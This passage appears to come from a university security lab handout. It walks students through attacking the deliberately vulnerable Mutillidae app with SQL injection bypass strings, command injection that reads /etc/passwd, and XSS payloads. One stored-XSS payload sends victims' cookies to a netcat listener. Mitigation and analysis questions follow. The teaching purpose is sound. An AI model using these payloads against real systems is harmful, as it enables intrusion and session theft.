+<h4 id="step-1-access-the-vulnerable-login-page"><strong>Step 1: Access the Vulnerable Login Page</strong> </h4>
+<ul>
+<li>Open your browser in Kali Linux.</li>
+<li>Visit:<pre data-role="codeBlock" data-info="" class="language-text"><code>http://&lt;M2-IP&gt;/mutillidae/index.php?page=login.php
+</code></pre></li>
+<li>This page includes fields for <em>Username</em> and <em>Password</em>. You’ll test which field is injectable.</li>
+</ul>
+<hr>
+<h4 id="step-2-attempt-sql-injection-for-login-bypass"><strong>Step 2: Attempt SQL Injection for Login Bypass</strong> </h4>
+<ul>
+<li>In the login form, try the following payloads in either the username or password field:<pre data-role="codeBlock" data-info="sql" class="language-sql sql"><code><span class="token string">' OR '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span class="token string">' -- 
+'</span> <span class="token operator">OR</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#</span>
+admin'<span class="token comment">-- </span>
+</code></pre></li>
+<li>Submit the form and observe if login is bypassed (you should be redirected or shown as logged in).</li>
+</ul>
+<hr>
+<h4 id="analyze-and-respond"><strong>Analyze and Respond</strong> </h4>
+<ol>
+<li>Based on successful login, answer:</li>
+</ol>
+<ul>
+<li>Which input field is injectable?</li>
+<li>What part of the SQL query was manipulated?</li>
+<li>Why does a condition like <code>'1'='1'</code> always succeed?</li>
+</ul>
+<ol start="2">
+<li>What type of SQL Injection did you exploit (e.g., Boolean-based, error-based)?</li>
+<li>What are the signs of successful exploitation?</li>
+<li>What limitations exist in this type of injection (e.g., data extraction, visibility, input sanitization)?</li>
+<li>Suggest at least <strong>two mitigation strategies</strong> (e.g., prepared statements) and explain why they are effective.</li>
+</ol>
+<hr>
+<h4 id="deliverables"><strong>Deliverables</strong> </h4>
+<ul>
+<li>📷 Screenshot showing successful login bypass using SQLi.</li>
+<li>✍️ Answers to all questions.</li>
+</ul>
+<hr>
+<h3 id="-task-2-command-injection-20-points">🔹 <strong>Task 2: Command Injection (20 Points)</strong> </h3>
+<p><strong>Objective</strong>: Exploit OS command injection vulnerabilities via the DNS Lookup form in Mutillidae.</p>
+<hr>
+<h4 id="step-1-access-the-vulnerable-feature"><strong>Step 1: Access the Vulnerable Feature</strong> </h4>
+<ul>
+<li>Open your browser in Kali.</li>
+<li>Navigate to:<pre data-role="codeBlock" data-info="" class="language-text"><code>http://&lt;M2-IP&gt;/mutillidae/index.php?page=dns-lookup.php
+</code></pre></li>
+<li>Locate the input field where you can enter a domain or IP for DNS lookup.</li>
+</ul>
+<hr>
+<h4 id="step-2-test-normal-behavior"><strong>Step 2: Test Normal Behavior</strong> </h4>
+<ul>
+<li>Submit simple, valid inputs like:<pre data-role="codeBlock" data-info="" class="language-text"><code>127.0.0.1
+localhost
+</code></pre></li>
+<li>Confirm that the page returns standard DNS lookup results.</li>
+</ul>
+<hr>
+<h4 id="step-3-inject-shell-commands"><strong>Step 3: Inject Shell Commands</strong> </h4>
+<ul>
+<li>In the input field, append OS command separators and test commands like:<pre data-role="codeBlock" data-info="" class="language-text"><code>127.0.0.1; whoami
+localhost &amp;&amp; uname -a
+google.com || ls -la /
+</code></pre></li>
+<li>Submit and check if the output includes system information or file listings.</li>
+</ul>
+<hr>
+<h4 id="step-4-attempt-sensitive-file-access"><strong>Step 4: Attempt Sensitive File Access</strong> </h4>
+<ul>
+<li>Try injecting commands that dump system data:<pre data-role="codeBlock" data-info="" class="language-text"><code>127.0.0.1; cat /etc/passwd
+127.0.0.1; ls -l /var/www/
+</code></pre></li>
+</ul>
+<hr>
+<h4 id="analyze-and-respond-1"><strong>Analyze and Respond</strong> </h4>
+<ul>
+<li>What type of command injection did you observe, <strong>reflected</strong> or <strong>blind</strong>?</li>
+<li>Were some command separators (e.g., <code>;</code>, <code>&amp;&amp;</code>, <code>||</code>) blocked or filtered?</li>
+<li>Could this vulnerability be used for <strong>privilege escalation</strong>, <strong>persistence</strong>, or <strong>lateral movement</strong>?</li>
+<li>What are two <strong>server-side input validation techniques</strong> that could prevent this attack?</li>
+</ul>
+<hr>
+<h4 id="deliverables-1"><strong>Deliverables</strong> </h4>
+<ul>
+<li>📷 Screenshot showing successful command injection (e.g., output of <code>whoami</code>, <code>uname</code>, or <code>cat /etc/passwd</code>).</li>
+<li>✍️ Answers to analysis questions.</li>
+</ul>
+<hr>
+<h3 id="-task-3-cross-site-scripting-20-points">🔹 <strong>Task 3: Cross-Site Scripting (20 Points)</strong> </h3>
+<p><strong>Objective</strong>: Identify and exploit stored and reflected XSS vulnerabilities in Mutillidae.</p>
+<hr>
+<h3 id="-part-a-reflected-xss">🔸 <strong>Part A: Reflected XSS</strong> </h3>
+<h4 id="step-1-access-the-vulnerable-page"><strong>Step 1: Access the vulnerable page</strong> </h4>
+<ul>
+<li>Open your browser and navigate to:<pre data-role="codeBlock" data-info="" class="language-text"><code>http://&lt;M2-IP&gt;/mutillidae/index.php?page=set-background-color.php
+</code></pre></li>
+</ul>
+<h4 id="step-2-inject-a-script-via-the-color-input-field"><strong>Step 2: Inject a script via the color input field</strong> </h4>
+<ul>
+<li>In the <strong>"Background Color"</strong> input box, enter a JavaScript payload:<pre data-role="codeBlock" data-info="html" class="language-html html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</code></pre></li>
+<li>Alternatively, use a less obvious payload such as:<pre data-role="codeBlock" data-info="html" class="language-html html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS2'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>
+</code></pre></li>
+</ul>
+<h4 id="step-3-submit-the-input"><strong>Step 3: Submit the input</strong> </h4>
+<ul>
+<li>Observe whether the script executes (e.g., an alert box appears).</li>
+</ul>
+<h4 id="step-4-view-the-source"><strong>Step 4: View the source</strong> </h4>
+<ul>
+<li>Use the browser's "View Page Source" option to inspect how the payload is reflected.</li>
+<li>Look for:
+<ul>
+<li>Whether the input is embedded directly into the HTML</li>
+<li>Whether any sanitization or escaping is applied</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h4 id="-deliverables">✅ <strong>Deliverables</strong> </h4>
+<ul>
+<li>📸 Screenshot showing the alert box triggered by your payload.</li>
+<li>Screenshot of the view-source where the injected code is located.</li>
+<li>📝 Answer the following:
+<ol>
+<li>Which input field reflected your script?</li>
+<li>Where in the page source did the payload appear?</li>
+<li>What could an attacker do beyond triggering a popup?</li>
+</ol>
+</li>
+</ul>
+<hr>
+<h3 id="-part-b-stored-xss">🔸 <strong>Part B: Stored XSS</strong> </h3>
+<h4 id="step-1-access-the-vulnerable-blog-input-form"><strong>Step 1: Access the vulnerable blog input form</strong> </h4>
+<ul>
+<li>Navigate to the following URL in your browser:<pre data-role="codeBlock" data-info="" class="language-text"><code>http://&lt;M2-IP&gt;/mutillidae/index.php?page=add-to-your-blog.php
+</code></pre></li>
+<li>This page allows users to submit blog comments, which are later rendered to all users.</li>
+</ul>
+<h4 id="step-2-set-up-a-listener-on-your-kali-machine"><strong>Step 2: Set up a listener on your Kali machine</strong> </h4>
+<ul>
+<li>In a separate terminal window on Kali, set up a listener to capture exfiltrated cookies:<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">sudo</span> <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">80</span>
+</code></pre></li>
+</ul>
+<h4 id="step-3-submit-a-stored-xss-payload"><strong>Step 3: Submit a stored XSS payload</strong> </h4>
+<ul>
+<li>In the <strong>blog comment</strong> or <strong>name</strong> field, enter the following payload:<pre data-role="codeBlock" data-info="html" class="language-html html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"http://192.168.10.4/?cookie="</span><span class="token operator">+</span><span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token property-access">cookie</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</code></pre></li>
+<li>Replace <code>&lt;Kali-IP&gt;</code> with the actual IP address of your Kali machine.</li>
+</ul>
+<h4 id="step-4-simulate-a-victim-user-loading-the-page"><strong>Step 4: Simulate a victim user loading the page</strong> </h4>
+<ul>
+<li>Open a <strong>private/incognito browser window</strong>.</li>
+<li>Revisit the blog post page to simulate a different user viewing the injected content:<pre data-role="codeBlock" data-info="" class="language-text"><code>http://&lt;M2-IP&gt;/mutillidae/index.php?page=view-someones-blog.php
+</code></pre>In <strong>Please Choose Author</strong>, select Show All, and then click <strong>View Blog Entries</strong>.</li>
+</ul>
+<h4 id="step-5-confirm-the-result"><strong>Step 5: Confirm the result</strong> </h4>
+<ul>
+<li>If the exploit works, the alert will not pop up, but your Kali terminal should receive a connection with the victim’s cookie string.</li>
+</ul>
+<hr>
+<h4 id="analyze-and-respond-2"><strong>Analyze and Respond:</strong> </h4>
+<ol>
+<li>What allowed the script to persist across page loads?</li>
+<li>What actions could an attacker perform after stealing a session cookie?</li>
+<li>How would the <code>SameSite=Strict</code> cookie attribute prevent this?</li>
+</ol>
+<hr>
+<h4 id="-deliverables-1">✅ <strong>Deliverables</strong> </h4>
+<ul>
+<li>📸 Screenshot showing your payload visible in the blog post or executed automatically.</li>
+<li>📸 Screenshot of the stolen cookie or captured HTTP request in the Kali listener.</li>
+<li>📝 Answer to analysis questions.</li>
+</ul>
+<div style="text-align: center; margin: 15px 1;">
+    <hr style="border: 5px; height: 20px; width: 100%;">
+</div>
+<h2 id="part-4-vulnerability-scanning-and-analysis-50-points"><strong>Part 4: Vulnerability Scanning and Analysis (50 Points)</strong> </h2>
+<p><strong>Goal</strong>: Perform active vulnerability scanning on Metasploitable-2 using Nmap, analyze results by researching CVEs and CWEs, correlate with attacker behavior using the MITRE ATT&amp;CK framework, and propose appropriate mitigation strategies.</p>
+<hr>
+<h3 id="-task-1-vulnerability-scanning-with-nmap-10-points">🔹 <strong>Task 1: Vulnerability Scanning with Nmap (10 Points)</strong> </h3>
+<p><strong>Objective</strong>: Use Nmap to identify open ports and known vulnerabilities using service detection and vulnerability scripts.</p>
+<h4 id="instructions"><strong>Instructions</strong>: </h4>
+<ol>
+<li>
+<p><strong>Perform an initial scan to discover services</strong>:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>nmap <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> <span class="token punctuation">[</span>MS2-IP<span class="token punctuation">]</span>
+</code></pre><ul>
+<li><code>-sV</code>: Enables service/version detection.</li>
+<li><code>-p-</code>: Scans all 65535 TCP ports.</li>
+<li><code>-T4</code>: Speeds up the scan moderately.</li>
+<li><code>-v</code>: Verbose output</li>
+</ul>
+</li>
+<li>
+<p><strong>Run vulnerability script scan</strong>:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">--script</span> vuln <span class="token punctuation">[</span>MS2-IP<span class="token punctuation">]</span> 
+</code></pre></li>
+<li>
+<p><strong>Record Results</strong>:</p>
+<ul>
+<li>Save the full output.</li>
+<li>Capture <strong>screenshots</strong> of important findings (e.g., FTP, Tomcat, Samba, IRC).</li>
+<li>Highlight services with known vulnerabilities.</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="-task-2-identify-and-analyze-five-vulnerabilities-10-points">🔹 <strong>Task 2: Identify and Analyze Five Vulnerabilities (10 Points)</strong> </h3>
+<p><strong>Objective</strong>: Select <strong>five vulnerabilities</strong> from Nmap results and provide in-depth technical analysis.</p>
+<h4 id="for-each-vulnerability-include"><strong>For each vulnerability, include</strong>: </h4>
+<ol>
+<li>
+<p><strong>Service Information</strong>:</p>
+<ul>
+<li>Service name and version (e.g., <code>vsftpd 2.3.4</code>)</li>
+<li>Port number</li>
+</ul>
+</li>
+<li>
+<p><strong>CVE Details</strong>:</p>
+<ul>
+<li>CVE ID (e.g., <code>CVE-2011-2523</code>)</li>
+<li>CVSS severity score (e.g., 9.3 Critical)</li>
+<li>Vulnerability type (e.g., Backdoor, RCE, Auth Bypass)</li>
+<li>Description of how the vulnerability works</li>
+</ul>
+</li>
+<li>
+<p><strong>Exploitability</strong>:</p>
+<ul>
+<li>Is there a known <code>Metasploit</code> or <code>exploit-db</code> module?</li>
+<li>What privileges does the exploit grant?</li>
+</ul>
+</li>
+<li>
+<p><strong>Example Exploit Path</strong> <em>(if applicable)</em>:</p>
+<ul>
+<li>How could an attacker proceed post-exploitation?</li>
+<li>What data or control could be gained?</li>
+</ul>
+</li>
+</ol>
+<p>📌 <strong>Key Resources</strong>:</p>
+<ul>
+<li><a href="https://cve.mitre.org">https://cve.mitre.org</a></li>
+<li><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li>
+<li><a href="https://nvd.nist.gov">https://nvd.nist.gov</a></li>
+</ul>
+<hr>
+<h3 id="-task-3-cwe-classification-and-impact-analysis-10-points">🔹 <strong>Task 3: CWE Classification and Impact Analysis (10 Points)</strong> </h3>
+<p><strong>Objective</strong>: For each of the five vulnerabilities, map it to the correct <strong>Common Weakness Enumeration (CWE)</strong> ID.</p>
+<h4 id="steps"><strong>Steps</strong>: </h4>
+<ol>
+<li>Identify the relevant CWE ID (e.g., CWE-77: Command Injection, CWE-120: Classic Buffer Overflow).</li>
+<li>Visit <a href="https://cwe.mitre.org">https://cwe.mitre.org</a> to confirm definitions and typical impacts.</li>
+<li>Explain the weakness <em>class</em> and how it contributes to the actual exploit.</li>
+<li>Consider general impacts: e.g., data confidentiality loss, privilege escalation, or full system compromise.</li>
+</ol>
+<hr>
+<h3 id="-task-4-mitre-attck-mapping-10-points">🔹 <strong>Task 4: MITRE ATT&amp;CK Mapping (10 Points)</strong> </h3>
+<p><strong>Objective</strong>: Relate <strong>at least two</strong> vulnerabilities to ATT&amp;CK tactics and techniques.</p>
+<h4 id="instructions-1"><strong>Instructions</strong>: </h4>
+<p>For two of your selected vulnerabilities, identify:</p>
+<ul>
+<li><strong>Tactic</strong> (e.g., Initial Access, Privilege Escalation)</li>
+<li><strong>Technique</strong> (e.g., <code>T1190 – Exploit Public-Facing Application</code>)</li>
+<li><strong>Brief explanation</strong> of how an attacker would use this exploit in a real-world campaign.</li>
+</ul>
+<p>📌 Use: <a href="https://attack.mitre.org/">https://attack.mitre.org/</a></p>
+<hr>
+<h3 id="-task-5-mitigation-strategies-10-points">🔹 <strong>Task 5: Mitigation Strategies (10 Points)</strong> </h3>
+<h4 id="for-each-vulnerability"><strong>For each vulnerability</strong>: </h4>
+<ol>
+<li>
+<p>Recommend at least one <strong>technical</strong> and one <strong>administrative</strong> control.</p>
+<ul>
+<li>Example Technical: Patch the service, disable the vulnerable feature, firewall filtering</li>
+<li>Example Administrative: Update security policy, restrict network access, enable logging/monitoring</li>
+</ul>
+</li>
+<li>
+<p>Identify <strong>whether the mitigation would be preventive, detective, corrective, or proactive</strong>.</p>
+</li>
+</ol>
+<hr>
+<h3 id="analyze-and-respond-3">Analyze and Respond: </h3>
+<ol>
+<li>How does vulnerability scanning help in reducing attack surface?</li>
+<li>What risks arise from false positives/negatives in automated tools like Nmap?</li>
+<li>If you were a system admin, what <strong>defense-in-depth</strong> measures would you deploy for services exposed to the internet?</li>
+</ol>
+<hr>
+<h3 id="deliverables-for-part-4"><strong>Deliverables for Part 4</strong>: </h3>
+<ol>
+<li>
+<p>📷 <strong>Screenshots or saved text logs</strong> of:</p>
+<ul>
+<li>Nmap port scan (<code>-sV -p-</code>)</li>
+<li>Nmap vuln script output (<code>--script vuln</code>), clearly showing selected vulnerabilities.</li>
+</ul>
+</li>
+<li>
+<p>📝 <strong>Report Section</strong>:</p>
+<ul>
+<li>Table or paragraph for <strong>five vulnerabilities</strong> including:
+<ul>
+<li>CVE ID, Service, Port</li>
+<li>CWE ID with description</li>
+<li>CVSS score and exploitability</li>
+<li>ATT&amp;CK mapping (for at least two)</li>
+<li>Proposed mitigations and justification</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Answer to analysis questions</p>
+</li>
+</ol>
+<hr>
+
+      </div>
+      
+      
+    
+    
+    
+    
+    
+    
+  
+    </body></html>
